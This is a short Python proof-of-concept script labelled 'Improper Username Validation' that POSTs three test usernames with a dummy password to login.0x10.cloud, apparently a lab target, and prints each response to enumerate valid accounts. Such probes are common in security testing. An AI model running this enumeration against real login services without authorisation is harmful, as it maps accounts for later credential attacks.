# ============================================================
# Author: Pedro Souza
# Vulnerability: Improper Username Validation
# Target: login.0x10.cloud
# ============================================================

import urllib.request
import urllib.parse
import json

url = "http://login.0x10.cloud"

usernames = ["admin", "random123", "abcxyz"]

for username in usernames:
    data = urllib.parse.urlencode({
        "username": username,
        "password": "test"
    }).encode()

    try:
        req = urllib.request.Request(url, data=data)
        response = urllib.request.urlopen(req)
        result = json.loads(response.read())

        print(f"Testing username: {username}")
        print(result)
        print("-" * 40)

    except Exception as e:
        print(f"Error: {e}")